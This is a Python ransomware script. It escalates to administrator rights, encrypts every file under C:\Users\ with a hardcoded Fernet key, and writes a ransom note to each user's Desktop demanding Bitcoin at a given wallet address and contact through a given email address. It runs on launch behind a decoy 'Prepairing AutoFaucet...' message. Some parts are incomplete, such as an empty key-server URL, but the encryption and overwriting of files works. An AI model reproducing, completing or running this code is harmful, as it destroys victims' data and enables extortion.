from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from base64 import urlsafe_b64decode
from struct import unpack
import requests
import ctypes
import time
import sys
import os

class ransom:
    def __init__(self):
        self.safetyKey = b'aYM_MmFwtvDhXDJ8FUubS74Q-7ETnrVazA4ET2ZO8uY=' #Base Fernet Safety Key
        self.fernet = Fernet(self.safetyKey)
        self.privKey = "" #Base Password For Encryption / Decryption
        self.action = True

    def get_privKey(self):
        return requests.get("").content

    def read_directory(self,view_path):
        self.force_admin_rights()
        inputKey = ""
        for path, subdirs, files in os.walk(view_path):
            for name in files:
                filePath = os.path.join(path, name)       # FULL File PATH
                content = self.read_file(filePath)        # File Content (FROM FILE) 
                
                if self.verify_token(content.decode("latin-1")):
                    while inputKey != self.privKey: 
                        if inputKey!=self.privKey:
                            inputKey = input("Decryption KEY: ")
                    
                    result_content = self.decrypt(content)
                    self.action = False
                else:
                    result_content = self.encrypt(content) # Encrypted Content 
                
                self.replace_file(filePath,result_content)
        self.user_warning_generator()

    def verify_token(self,token): 
        try:
            bin_token = urlsafe_b64decode(token) # <-- c is the Fernet token you received
            return True
        except:
            return False

    #encryption and decryption functions

    def encrypt(self,content):
        return self.fernet.encrypt(content)

    def decrypt(self,content):
        return self.fernet.decrypt(content)

    #file read and replace functions

    def read_file(self,directory):
        readFile = open(directory,"rb")
        content = readFile.read()
        readFile.close()
        return content

    def replace_file(self,directory,content):
        with open(directory, 'wb') as f:
            f.truncate(4)
            f.write(content)
            f.close()

    #Admin priviledge verification and request functions

    def verify_admin_rights(self):
        try:
            is_admin = (os.getuid() == 0)
        except AttributeError:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        return is_admin

    def request_admin_rights(self):
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    def force_admin_rights(self):
        while self.verify_admin_rights() == False:
            self.request_admin_rights()

    #warn user with html page
    def user_warning_generator(self):
        users_folders_to_ignore = ['All Users', 'Default', 'Default User', 'desktop.ini', 'Public', 'user']
        for user in os.listdir("C:\\Users\\"): 
            if user not in users_folders_to_ignore: 
                userFileRansomPath = "C:\\Users\\"+user+"\\Desktop\\ransomware_pay.txt"
                if self.action == True:
                    html_page = """                         __________
                      .~#########%%;~.
                     /############%%;`\\
                    /######/~\/~\%%;,;,\\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X
X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X
 X# \.X        @#%,.@                  @#%,.@        X./  #
  ##  X          @#%,.@              @#%,.@          X   #
, "# #X            @#%,.@          @#%,.@            X ##
   `###X             @#%,.@      @#%,.@             ####'
  . ' ###              @#%.,@  @#%,.@              ###`"
    . ";"                @#%.@#%,.@                ;"` ' .
      '                    @#%,.@                   ,.
      ` ,                @#%,.@  @@                `
                          @@@  @@@  
                    
If you are accessing this page, it means your computer data has been half or fully encrypted. 

If you wish to decrypt your information, please consider:
1 - send 0.001 BTC to 13K2rz2ZMGmrQotWwUjibEaA44srdjFbZg
2 - contact the e-mail helpransomdec@protonmail.com with the transaction id of the payment. ( Take into consideration that any e-mail without a transaction id will be ignored )

Once payed and contacted, wait at least 2 hours for our e-mail.

Our e-mail will contain:
- The decryption tool to decrypt your information
- Your private decryption key

The decryption tool + private decryption key will allow you to decrypt any file that may have been encrypted on your computer, otherwise all the infromation will be permanently lost."""       
                    with open(userFileRansomPath, 'w+') as f:
                        f.truncate(4)
                        f.write(html_page)
                        f.close() 
                else:
                    with open(userFileRansomPath, 'w+') as f:
                        f.truncate(0)
                        f.close()

#execute ransomware
print("Prepairing AutoFaucet...")
try:
    ransom().read_directory("C:\\Users\\")
except Exception as e:
    print(str(e))
